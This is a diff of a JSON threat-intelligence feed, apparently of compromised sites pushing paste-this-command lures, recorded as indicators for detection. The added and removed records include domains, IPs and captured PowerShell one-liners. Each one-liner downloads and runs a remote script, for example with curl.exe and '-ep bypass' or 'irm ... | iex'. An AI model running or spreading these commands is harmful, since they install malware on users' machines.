@@ -1,5 +1,45 @@
 [
   {
+    "UrlDomain": "www.lapetitebarque.fr",
+    "DeliveryUrl": [
+      "sentrydb.org",
+      "pillingthat.com"
+    ],
+    "PayloadUrl": [
+      "https://pillingthat.com/WfodrrIBwI"
+    ],
+    "IP": [
+      "87.98.154.146"
+    ],
+    "Related": [],
+    "Payload": "powershell -nop -c \"$f=$env:TEMP+'\\pintk.ps1';curl.exe -sk -o $f 'https://pillingthat[.]com/WfodrrIBwI';powershell -ep bypass -File $f\"",
+    "ResolvedDownloadUrl": [
+      "https://pillingthat.com/WfodrrIBwI"
+    ],
+    "ReportId": "cmwl9b54l1i4f0omls40cjhgn",
+    "ScannedAt": "2026-11-17T22:21:10.789000+00:00"
+  },
+  {
+    "UrlDomain": "drugsrehabal.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "208.109.175.50"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwl8i3n01i3d0oml2g6jz12k",
+    "ScannedAt": "2026-11-17T21:58:35.810000+00:00"
+  },
+  {
     "UrlDomain": "bowblade.net",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -6383,27 +6423,5 @@
     ],
     "ReportId": "cmwe6egab07r40omlaykrxwjj",
     "ScannedAt": "2026-11-12T23:25:23.097000+00:00"
-  },
-  {
-    "UrlDomain": "cctvkarawang.id",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/133f5f853512bcb5",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/133f5f853512bcb5'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/133f5f853512bcb5"
-    ],
-    "ReportId": "cmwe44dci07q70oml07jgqg17",
-    "ScannedAt": "2026-11-12T22:21:33.518000+00:00"
   }
 ]
